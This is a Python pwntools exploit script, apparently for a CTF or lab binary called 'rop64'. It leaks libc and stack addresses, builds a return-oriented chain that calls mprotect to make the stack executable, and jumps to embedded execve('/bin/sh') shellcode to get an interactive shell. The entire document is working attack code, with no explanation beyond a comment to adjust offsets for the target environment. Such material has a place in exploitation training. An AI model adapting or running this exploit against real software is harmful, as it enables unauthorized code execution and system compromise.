from pwn import *
from struct import *
 
#context.log_level = 'debug'

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libcbase_printf_offset = libc.symbols['printf']
libcbase_mprotect_offset = libc.symbols['mprotect']

#You need to change the value to match the environment you are testing.
pop_rdi_ret = 0x004007b3 
pop_rdx_ret_offset = 0x1150c9
 
r = process('./rop64')
 
r.recvn(10)
r.recvuntil('Printf() address : ')
libcbase = int(r.recvuntil('\n'),16)
libcbase -= libcbase_printf_offset 

r.recvuntil('buf[50] address : ')
stack = int(r.recvuntil('\n'),16)
back = str(hex(stack))
shellArea = int(back[0:11] + '000',16)

log.info(back[0:11])
log.info(hex(shellArea))
log.info("libcbase : " + hex(libcbase))
log.info("stack : " + hex(stack))
log.info("mprotect() : " + hex(libcbase + libcbase_mprotect_offset))

payload = shellcode 
payload += "A" * (72 - len(shellcode))


#mprotect(address of shellcode,0x2000,0x7)
payload += p64(pop_rdi_ret)
payload += p64(shellArea)
payload += p64(libcbase + pop_rdx_ret_offset)
payload += p64(0x7)
payload += p64(0x2000)
payload += p64(libcbase + libcbase_mprotect_offset)
payload += p64(stack)
 
r.send(payload)
r.interactive()
